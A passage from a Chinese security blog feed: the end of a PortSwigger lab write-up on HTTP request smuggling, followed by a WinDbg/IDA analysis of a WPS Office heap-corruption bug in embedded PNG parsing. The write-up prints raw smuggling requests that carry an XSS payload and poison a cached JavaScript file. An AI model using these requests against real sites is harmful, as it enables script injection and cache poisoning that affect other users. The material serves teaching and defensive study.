<p>首先根据UA出现的位置构造Payload</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200503751.png" alt="image-20201201200503751"></p>
<p>然后构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac801fd21fef85b98012b3a700820000.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 123</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post?postId&#x3D;5 HTTP&#x2F;1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;#</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>此时在浏览器中访问，就会触发弹框</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200603371.png" alt="image-20201201200603371"></p>
<p>再重新发一下，等一会刷新，可以看到这个实验已经解决了。</p>
<h3 id="5-进行缓存投毒"><a href="#5-进行缓存投毒" class="headerlink" title="5 进行缓存投毒"></a>5 进行缓存投毒</h3><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
<p>实验环境中提供了漏洞利用的辅助服务器。</p>
<p>需要添加两个请求包，一个POST，携带要走私的请求包，另一个是正常的对JS文件发起的GET请求。</p>
<p>以下面这个JS文件为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;resources&#x2F;js&#x2F;labHeader.js</span><br></pre></td></tr></table></figure>

<p>编辑响应服务器</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200709663.png" alt="image-20201201200709663"></p>
<p>构造POST走私数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: acb11fe31e16e96b800e125a013b009f.web-security-academy.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>然后构造GET数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;js&#x2F;labHeader.js HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST请求和GET请求交替进行，多进行几次，然后访问js文件，响应为缓存的漏洞利用服务器上的文件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200757014.png" alt="image-20201201200757014"></p>
<p>访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200845798.png" alt="image-20201201200845798"></p>
<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><blockquote>
<ul>
<li>禁用代理服务器与后端服务器之间的 TCP 连接重用</li>
<li>使用 HTTP/2 协议</li>
<li>前后端使用相同的服务器</li>
</ul>
<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用 HTTP/2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP/2 协议的服务器也会兼容 HTTP/1.1。从本质上来说，HTTP 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现 RFC7230-7235 中所规定的的标准，但这也是最难做到的。</p>
</blockquote>
<p>对于HTTP/2 能避免请求走私的原理，去查了一下HTTP/2 简介，总结一下，HTTP/1.1 的一些特性为请求走私创造了条件：</p>
<blockquote>
<ol>
<li><p>纯文本，以换行符作为分隔符</p>
</li>
<li><p>序列和阻塞机制</p>
</li>
</ol>
</blockquote>
<p>而在HTTP/2 中已经没有了产生请求走私的机会</p>
<blockquote>
<ol>
<li>使用<strong>二进制编码</strong>且分割为更小的传输单位（帧，拥有编号，<strong>可乱序传输</strong>）</li>
<li><strong>同一个来源的所有通信都在一个 TCP 连接上完成</strong>，此连接可以承载任意数量的双向数据流</li>
</ol>
</blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">With the new binary framing mechanism in place, HTTP&#x2F;2 no longer needs multiple TCP connections to multiplex streams in parallel; each stream is split into many frames, which can be interleaved and prioritized. As a result, all HTTP&#x2F;2 connections are persistent, and only one connection per origin is required, which offers numerous performance benefits.</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://paper.seebug.org/1048/#5">https://paper.seebug.org/1048/#5</a></p>
<p><a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>
<p><a href="https://xz.aliyun.com/t/6631">https://xz.aliyun.com/t/6631</a></p>
<p><a href="https://en.wikipedia.org/wiki/HTTP_pipelining">HTTP pipelining</a></p>
<p><a href="https://developers.google.com/web/fundamentals/performance/http2">HTTP/2 简介</a></p>
<p><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf">https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf</a></p>
<p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p>
]]></content>
      <categories>
        <category>协议分析</category>
      </categories>
      <tags>
        <tag>HTTP请求走私协议</tag>
        <tag>协议分析</tag>
      </tags>
  </entry>
  <entry>
    <title>金山WPS Office远程堆损坏漏洞</title>
    <url>/2020/09/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/%E9%87%91%E5%B1%B1WPS-Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>WPS Office是由Microsoft珠海的中国软件开发商金山软件开发的办公套件，适用于Microsoft Windows，macOS，Linux，iOS和Android。WPS Office由三个主要组件组成：WPS Writer，WPS Presentation和WPS Spreadsheet。个人基本版本可以免费使用。WPS Office软件中存在一个远程执行代码漏洞，是当Office软件在分析特制Office文件时不正确地处理内存中的对象时引起的。成功利用此漏洞的攻击者可以在当前用户的上下文中运行任意代码。故障可能会导致拒绝服务。漏洞产品WPS Office，影响版本11.2.0.9453。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在WPS Office中用于图像格式解析的Qt模块中发现堆损坏。嵌入WPS office的特制图像文件可能会触发此漏洞。打开特制的文档文件时，触发访问冲突。EDX指向数组的指针，而EAX是指向数组的索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(c50.b4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;006f1c48 ecx&#x3D;cd2aefbc edx&#x3D;cd2c6f80 esi&#x3D;2ed7ae18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;006f1b44 ebp&#x3D;006f1b44 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00210202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>崩溃是如何触发的？让我们看一下PNG标头格式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00029E30  FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44  ÿ‰PNG........IHD</span><br><span class="line">00029E40  52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A  R...€...Æ.......</span><br><span class="line">00029E50  27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98  &#39;ü....gAMA..±ˆ•˜</span><br><span class="line">00029E60  F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00  ô¦...0PLTE...€..</span><br><span class="line">00029E70  00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80  .€.€€...€€.€.€€€</span><br><span class="line">00029E80  80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00  €€ÀÀÀÿ...ÿ.ÿÿ...</span><br><span class="line">00029E90  FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00  ÿÿ.ÿ.ÿÿÿÿÿ&#123;.±Ä..</span><br></pre></td></tr></table></figure>

<p>从偏移量0x29E31开始-0x29E34是PNG文件格式的签名标头。PNG头文件的结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PNG signature --&gt; IHDR --&gt; gAMA --&gt; PLTE --&gt; pHYs --&gt; IDAT --&gt; IEND</span><br></pre></td></tr></table></figure>

<p>在这种情况下，当WPS Office Suite中使用的QtCore库解析PLTE结构并触发堆破坏时，该漏洞位于Word文档中的嵌入式PNG文件中。在偏移量0x29E82到0x29E85处，调色板的解析失败，从而触发了堆中的内存损坏。崩溃触发之前的堆栈跟踪：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71</span><br><span class="line">01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b</span><br><span class="line">04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8</span><br><span class="line">05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325</span><br><span class="line">08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br></pre></td></tr></table></figure>

<p>在QtCore4解析嵌入式图像之前，我们可以看到来自KSO模块的最后一次调用，试图处理图像kso！GdiDrawHoriLineIAlt。使用IDA Pro分解应用程序来分析发生异常的功能。最后的崩溃路径如下（WinDBG结果）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>在IDA Pro中打开时，我们可以按以下方式反汇编该函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:67353315                 push    ebp</span><br><span class="line">.text:67353316                 mov     ebp, esp</span><br><span class="line">.text:67353318                 movzx   eax, byte ptr [ecx+edx]  ; crash here</span><br><span class="line">.text:6735331C                 mov     ecx, [ebp+arg_0]</span><br><span class="line">.text:6735331F                 mov     edx, [ecx]</span><br><span class="line">.text:67353321                 mov     eax, [edx+eax*4+10h]</span><br><span class="line">.text:67353325                 mov     ecx, eax</span><br></pre></td></tr></table></figure>

<p>使用故障转储中的信息，我们知道应用程序在0x67353321（移动eax，[edx + eax * 4 + 10h]）处触发了访问冲突。我们可以看到EAX寄存器由0xc0值控制。因此，从这里我们可以根据导致异常的指令对寄存器的状态进行一些假设。需要注意的重要一点是，在发生异常之前，我们可以看到ECX（0xc0）中包含的值被写入到以下指令所定义的任意位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+arg_0]</span><br></pre></td></tr></table></figure>

<p>此外，我们注意到，在我们的故障指令之外，EBP的偏移量存储在ECX寄存器中。我们在前面提到的指令（偏移量为0x6ba1331c）上设置了一个断点，以观察内存。断点触发后，我们可以看到第一个值c45adfbc引用了另一个指针，该指针应该是指向数组的指针。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 0 hit</span><br><span class="line">eax&#x3D;0000000f ebx&#x3D;004f1b40 ecx&#x3D;d3544100 edx&#x3D;0000001c esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba1331c esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a3:</span><br><span class="line">6ba1331c 8b4d08          mov     ecx,dword ptr [ebp+8] ss:002b:004f1a3c&#x3D;c45adfbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ebp+8</span><br><span class="line">004f1a3c  c45adfbc 00000048 00000000 6f13830f  ..Z.H..........o</span><br><span class="line">004f1a4c  004f5cc8 00000000 00000000 00000000  .\O.............</span><br><span class="line">004f1a5c  00000000 004f65a0 004f662c 00000000  .....eO.,fO.....</span><br><span class="line">004f1a6c  779eae8e 00000000 00000001 3f800000  ...w...........?</span><br><span class="line">004f1a7c  3f800000 3f31e4f8 3f800000 3f800000  ...?..1?...?...?</span><br><span class="line">004f1a8c  3f800000 3f31e4f8 3f800000 3de38800  ...?..1?...?...&#x3D;</span><br><span class="line">004f1a9c  3de38800 3d9e1c8a 3c834080 004f3c00  ...&#x3D;...&#x3D;.@.&lt;.&lt;O.</span><br><span class="line">004f1aac  4101c71c 6ba13315 3f800000 4081c71c  ...A.3.k...?...@</span><br></pre></td></tr></table></figure>

<p>从c45adfbc观察内存引用，发现另一个指针。第一个值ab69cf80始终表示为指向它所引用的任何地方的指针。指针ab69cf80基本上是我们指针的索引数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; dc c45adfbc</span><br><span class="line">c45adfbc  ab69cf80 d3544100 00000003 00000280  ..i..AT.........</span><br><span class="line">c45adfcc  0000055a 00000012 c0c0c0c0 1c3870e2  Z............p8.</span><br><span class="line">c45adfdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">c45adfec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">c45adffc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">c45ae00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ab69cf80</span><br><span class="line">ab69cf80  00000001 0000001c 00000010 00000001  ................ &#x2F;&#x2F; 0000001c is overwritten in the register EDX and EDI before we trigger crash</span><br><span class="line">ab69cf90  ff000000 ff800000 ff008000 ff808000  ................ </span><br><span class="line">ab69cfa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">ab69cfb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ &#x2F;&#x2F; ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX</span><br><span class="line">ab69cfc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">ab69cfd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cfe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>因为我们知道崩溃的路径，所以我们可以使用下面的命令简单地设置一个断点。该命令将获得指针值“ edx + eax * 4 + 10”，并检查其是否满足0xc0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp 6ba13321 &quot;.if (poi(edx+eax*4+10) &#x3D;&#x3D; 0xc0) &#123;&#125; .else &#123;gc&#125;&quot;</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;004f1b40 ecx&#x3D;c45adfbc edx&#x3D;ab69cf80 esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>如果观察堆栈，可以看到以下执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">004f1a3c c45adfbc </span><br><span class="line">004f1a40 00000048 </span><br><span class="line">004f1a44 00000000 </span><br><span class="line">004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f</span><br><span class="line">004f1a4c 004f5cc8 </span><br><span class="line">004f1a50 00000000 </span><br><span class="line">004f1a54 00000000 </span><br><span class="line">004f1a58 00000000 </span><br><span class="line">004f1a5c 00000000 </span><br><span class="line">004f1a60 004f65a0 </span><br><span class="line">004f1a64 004f662c </span><br><span class="line">004f1a68 00000000 </span><br><span class="line">004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e</span><br></pre></td></tr></table></figure>

<p>如果我们反汇编6ba3cb98，则可以看到以下反汇编代码。真正的根本原因在于此代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h]</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch]</span><br><span class="line">6ba3cb92 52              push    edx</span><br><span class="line">6ba3cb93 8bd7            mov     edx,edi</span><br><span class="line">6ba3cb95 ff5580          call    dword ptr [ebp-80h]</span><br><span class="line">6ba3cb98 8b4e7c          mov     ecx,dword ptr [esi+7Ch]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C pseudo code</span><br><span class="line"></span><br><span class="line">grad &#x3D; *(&amp;ptr_grad);</span><br><span class="line">if ( grad &gt; 0.0099999998 )</span><br><span class="line">&#123;</span><br><span class="line">   input_value &#x3D; grad_size(check, size, input);</span><br><span class="line">   ptr_grad &#x3D; *(input);</span><br><span class="line">   ... cut here ...</span><br></pre></td></tr></table></figure>

<p>我们在6ba3cb89地址上设置断点，并观察ESI + 0xB4，我们可以看到一个指针指向另一个位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;00793938 esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb89 esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65:</span><br><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h] ds:002b:cb07decc&#x3D;cf69afbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc esi+0B4h</span><br><span class="line">cb07decc  cf69afbc c0c0c000 00000000 00000100  ..i.............</span><br><span class="line">cb07dedc  c0c0c0c0 00000000 00000000 00000000  ................</span><br><span class="line">cb07deec  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07defc  00000000 cf030fd0 00000000 00000000  ................</span><br><span class="line">cb07df0c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df1c  c0c0c0c0 00000000 3ff00000 00000000  ...........?....</span><br><span class="line">cb07df2c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df3c  00000000 00000000 3ff00000 00000000  ...........?....</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>从这里我们可以知道代码实际上没有从指针释放任何东西。一旦移至EDX，EDX将保留指向索引数组的指针：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;cf69afbc esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb8f esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b:</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch] ss:002b:00791864&#x3D;d1326100</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure>

<p>崩溃后的堆栈跟踪：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; kvL</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8</span><br><span class="line">01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b</span><br><span class="line">05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8</span><br><span class="line">06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325</span><br><span class="line">09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br><span class="line">0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23</span><br></pre></td></tr></table></figure>

<p>堆分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !heap -p -a cc53afbc</span><br><span class="line">    address cc53afbc found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 6731000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                cc36323c:         cc53afa8               58 -         cc53a000             2000</span><br><span class="line">    6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240</span><br><span class="line">    77a9909b ntdll!RtlDebugAllocateHeap+0x00000039</span><br><span class="line">    779ebbad ntdll!RtlpAllocateHeap+0x000000ed</span><br><span class="line">    779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f</span><br><span class="line">    779eae8e ntdll!RtlAllocateHeap+0x0000003e</span><br><span class="line">    6f080269 MSVCR100!malloc+0x0000004b</span><br><span class="line">    6f08233b MSVCR100!operator new+0x0000001f</span><br><span class="line">    6b726c67 QtCore4!QImageData::create+0x000000fa</span><br><span class="line">    6b726b54 QtCore4!QImage::QImage+0x0000004e</span><br><span class="line">    6b7a0e21 QtCore4!png_get_text+0x00000436</span><br><span class="line">    6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de</span><br><span class="line">    6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf</span><br><span class="line">    6b725eb4 QtCore4!QImageReader::read+0x000001e2</span><br><span class="line">    6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e</span><br><span class="line">    6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator&#x3D;+0x00000693</span><br><span class="line">    6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146</span><br><span class="line">    6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5</span><br><span class="line">    6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a</span><br><span class="line">    6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d</span><br><span class="line">    6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083</span><br><span class="line">    6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6</span><br><span class="line">    6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090</span><br><span class="line">    6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c</span><br><span class="line">    6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060</span><br><span class="line">    6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5</span><br><span class="line">    6d2b86a7 